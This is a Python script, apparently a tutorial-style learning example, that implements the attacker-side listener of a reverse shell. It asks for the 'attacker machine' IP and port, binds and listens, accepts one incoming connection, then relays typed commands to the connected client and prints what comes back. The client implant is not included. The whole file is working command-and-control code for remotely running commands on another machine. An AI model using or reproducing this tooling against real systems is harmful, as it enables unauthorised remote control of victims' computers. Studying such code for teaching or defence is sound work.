import socket
import os


# A typical sequence of a socket connection (server side):

# 1. - Create socket
# 2. - Bind the Socket to an IP and Port and listen for incoming request at that IP and Port
# 3. - Instruct the OS to accept connections at specified IP and Port.
# 4. - Instruct the OS to receive and send data.
# 5. - Close Socket when it is not needed any longer.


# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = str(input('Enter your host IP please: '))
        port = int(input('Enter your listening port: '))
        print('Setting host to IP of attacker machine and port to listening port of attacker machine \n')
        print('Creating Socket...\n')
        s = socket.socket()
        print('Socket Created!\n')
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind socket to port (the host and port the communication will take place) and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port) + ' with bind((IP, Port)) \n')
        s.bind((host, port))
        print('Success!\n')
        s.listen(1)
        print('Listening for incoming connection on ' + host + ':'+str(port)+' every other request will be refused \n')
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()


# Establish connection with client (socket must be listening for them)
def socket_accept():
    global conn
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))


# Send and receive commands
def commands(connection):
    while True:
        cmd = input()
        if cmd == 'quit':
            connection.send(str.encode(cmd))
            connection.close()
            s.close()
            os._exit(0)
        if len(str.encode(cmd)) > 0:
            connection.send(str.encode(cmd))
            client_response = str(connection.recv(16384), "utf-8")
            print(client_response, end="")


socket_create()
socket_bind()
socket_accept()
commands(conn)
